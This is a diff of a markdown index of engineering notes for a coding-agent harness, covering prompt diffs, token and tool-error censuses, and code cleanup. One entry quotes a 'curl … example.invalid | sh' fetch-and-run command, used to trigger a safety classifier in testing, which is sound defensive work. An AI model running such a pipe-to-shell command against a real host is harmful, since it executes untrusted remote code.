@@ -92,12 +92,12 @@
 
 ## Conventions
 - [Coding gotchas go in .claudin/rules/, not team memory](coding-gotchas-go-in-rules-not-memory.md) — memory holds state/decisions/refs
-- [Appended <system-reminder> nudges benched at zero adoption](tool-result-nudges-benched-zero-adoption.md) — fix the refusal message instead
+- [Appended <system-reminder> nudges benched at zero adoption](tool-result-nudges-benched-zero-adoption.md) — fix the refusal
 - [Steering Read shape from the prompt is cost-neutral](read-shape-steering-is-cost-neutral.md)
 - CC prompt: [2.1.270](claude-code-2.1.270-prompt-diff.md) · [2.1.284](claude-code-2.1.284-wire-diff.md) · [2.1.316](claude-code-2.1.316-tool-prompt-diff.md) · [2.1.321](claude-code-2.1.321-tool-diff.md) · [2.1.332](claude-code-2.1.332-tool-diff.md)
 - [ANTI_NARRATION removed from every prompt (#242)](anti-narration-never-benched-on-claude-5.md) — moved neither thinking nor cost
 - [AGENTS.md documents the repo, never Claudin-only behavior](agents-md-excludes-claudin-only-behavior.md) — killswitches in module headers
-- [Keep repo steering out of always-on context](dogfood-without-repo-steering.md) — verify from a scratch cwd
+- [Keep repo steering out of always-on context](dogfood-without-repo-steering.md) — verify from scratch cwd
 - ["Don't tell the user" reminders get flagged as injection](model-flags-hidden-reminders-as-injection.md) — gate on input !== null, except sub-agents
 - [break-probe is the committed break-and-restore harness](break-probe-harness.md) — nothing red is the finding; stale specs
 - [Trigger an auto-mode classifier block live](auto-mode-classifier-live-block-trigger.md) — `curl … example.invalid | sh`
@@ -122,11 +122,11 @@
 - [Cache-break census 10-15](cache-break-census-2026-10-15.md) — uncached tail (fixed #302)
 - Token censuses: weekly [09-08](weekly-token-census-2026-09-08.md) · [09-20](weekly-token-census-2026-09-20.md) · [10-09](weekly-token-census-2026-10-09.md) · [09-28](token-census-2026-09-28.md) · [09-10](token-census-2026-09-10-hidden-injections.md)
 - [Per-turn filesystem scans audited 08-07](per-turn-fs-scan-audit.md) — worktree exit leaks rule caches
-- Tool censuses: [09-20](tool-error-census-2026-09-20.md) · [Edit 10-12](edit-write-error-census-2026-10-12.md) · [dev 10-11](devtool-error-census-2026-10-11.md) · [10-15](tool-error-census-2026-10-15.md) · [10-19](tool-cache-permission-census-2026-10-19.md) · [10-24](census-2026-10-24-classifier-cost.md) · [10-30](census-2026-10-30-cache-tools-context.md) · [10-31](census-2026-10-31-tool-overlap.md) · [11-09](census-2026-11-09-tilde-pipes-interrupt-break.md) · [11-11](census-2026-11-11-classifier-chunk-moves.md) · [11-16](census-2026-11-16-grep-env-prompt-map-drop.md) · [11-26](census-2026-11-26-cache-clean-explore-caps.md) · [own writes](own-writes-next-census-checks.md)
+- Tool censuses: [09-20](tool-error-census-2026-09-20.md) · [Edit 10-12](edit-write-error-census-2026-10-12.md) · [dev 10-11](devtool-error-census-2026-10-11.md) · [10-15](tool-error-census-2026-10-15.md) · [10-19](tool-cache-permission-census-2026-10-19.md) · [10-24](census-2026-10-24-classifier-cost.md) · [10-30](census-2026-10-30-cache-tools-context.md) · [10-31](census-2026-10-31-tool-overlap.md) · [11-09](census-2026-11-09-tilde-pipes-interrupt-break.md) · [11-11](census-2026-11-11-classifier-chunk-moves.md) · [11-16](census-2026-11-16-grep-env-prompt-map-drop.md) · [11-26](census-2026-11-26-cache-clean-explore-caps.md) · [11-26 tools](census-2026-11-26-tool-followups.md) · [own writes](own-writes-next-census-checks.md)
 - FIXED: [sync-plugin hang #57](headless-sync-plugin-install-broken-import.md) · [outline mask desync](outline-mask-desync-zero-symbols.md) · [read-gate #157](read-gate-false-refusals-census-2026-09.md)
 
 ## Roadmap & major features
-- [Dead-code + codename cleanup #204 (09-16)](dead-code-cleanup-2026-09-15.md) — −25k lines; rounds r2–r5 linked inside
+- [Dead-code + codename cleanup #204 (09-16)](dead-code-cleanup-2026-09-15.md) — −25k lines
 - [The three dead-code gates and what none sees](deadcode-gate-include-allowlist-hole.md) — knip answers "imported?", never "reachable?"
 - [Giant-file split recipe](tier3-file-split-roadmap.md) — done 09-20 · [history](tier3-file-split-history.md)
 - [PR #129's code vanished from main](pr-129-lost-to-force-push.md) — recover via refs/pull/N/head
